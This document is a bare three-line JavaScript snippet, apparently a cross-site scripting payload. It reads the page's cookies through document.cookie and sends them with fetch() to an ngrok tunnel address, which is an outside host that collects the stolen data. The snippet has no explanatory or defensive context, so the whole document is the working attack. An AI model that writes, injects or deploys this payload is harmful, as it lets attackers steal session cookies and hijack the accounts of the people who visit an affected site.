fetch("https://ea5e-31-0-78-3.eu.ngrok.io?output="+document.cookie).then((res) => {
	return res.text();
})
